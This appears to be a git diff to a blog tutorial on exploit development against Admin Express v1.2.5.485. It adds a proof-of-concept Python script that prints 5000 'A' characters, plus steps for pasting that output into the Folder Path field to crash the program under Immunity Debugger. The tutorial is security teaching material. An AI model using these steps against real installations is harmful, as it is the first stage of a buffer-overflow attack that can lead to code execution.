@@ -18,9 +18,26 @@ Let's Get This Party Started!
 ---
 The vulnerability in this application arises from the __Folder Path__ field within the __System Compare__ configuration tab. [Open the application](https://admin-express.en.softonic.com/download), attach it to [Immunity Debugger](https://www.immunityinc.com/products/debugger/), and run it via Immunity.
 
-Going forward, we will be utilizing this proof of concept (PoC) Python script that will aid us in the exploit development lifecycle.
+Going forward, we will be utilizing this proof of concept (PoC) Python script that will aid us in the exploit development lifecycle. If you want to follow along, read the next couple of steps. If you are here for just the information, we are almost to the crash! Here is the script:
 
+```console
+root@kali:~/ADMIN_EXPRESS/POC# cat poc.py 
+# Proof of Concept for Admin Express v1.2.5.485 Exploit
+
+payload = "\x41" * 5000
+
+print payload
+
+#f = open('pwn.txt', 'w')
+#f.write(payload)
+#f.close()
+```
+A couple of notes about the above exploit. This script will generate 5000 \x41 characters, or A's. Notice how at the bottom of the script, the last three lines are commented out. This is due to the fact that this exploit would get tedious opening up a file everytime. Until we have commenced with the full development of this exploit, we will leave these closed and print straight to the console.
 
 
 Here are the next steps to get started:
 1. After starting the application in Immunity, click on the __System Compare__  tab in Admin Express.
+2. Run the above PoC script and copy the output to the clipboard.
+3. Paste the contents into the left hand __Folder Path__ field, and press the scale icon to the right of that same __Folder Path__ field
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/1.png" alt="">
